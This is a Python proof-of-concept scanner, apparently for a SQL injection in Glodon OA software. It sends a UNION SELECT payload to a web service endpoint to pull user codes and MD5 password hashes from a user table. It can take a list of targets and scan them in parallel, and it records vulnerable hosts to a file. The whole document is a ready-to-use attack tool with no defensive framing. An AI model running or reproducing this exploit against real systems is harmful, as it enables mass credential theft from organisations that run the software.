import requests,argparse,time,sys,urllib
from urllib.parse import unquote
requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool

def banner():
    test = """
        ___ _    , __   _
          /' )  / /  )_//
         /  /  / /  / /  
        /__(__/_(_\/ /___
            //     `     
           (/            
"""
    print(test)
def poc(target):
    try:
        payload= "/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary"
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "Accept":"text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            # "Referer":"http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx",
            "Accept-Encoding":"gzip, deflate",
            "Accept-Language":"zh-CN,zh;q=0.9",
            "Cookie":"",
            "Connection":"close",
            "Content-Type":"application/x-www-form-urlencoded",
            "Content-Length":"88"
        }
        proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080"
        }
        data = "dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --"
        res1 = requests.get(url=target,verify=False,timeout=15)
        if res1.status_code==200:
            res2 = requests.post(url=target+payload,verify=False,timeout=15,data=data,proxies=proxies,headers=headers)
            if res2.status_code==200:
                print(f"{target}存在漏洞")
                with open("广联达——result.txt","w",encoding="utf-8") as f:
                    f.write(f"该{target}存在漏洞\n")
            else:
                print(f"{target}不存在漏洞")
    except Exception as e:
        print(e)

def main():
    banner()
    parser =argparse.ArgumentParser(description="广联达oa SQL注入漏洞")
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")



if __name__ == '__main__':
    main()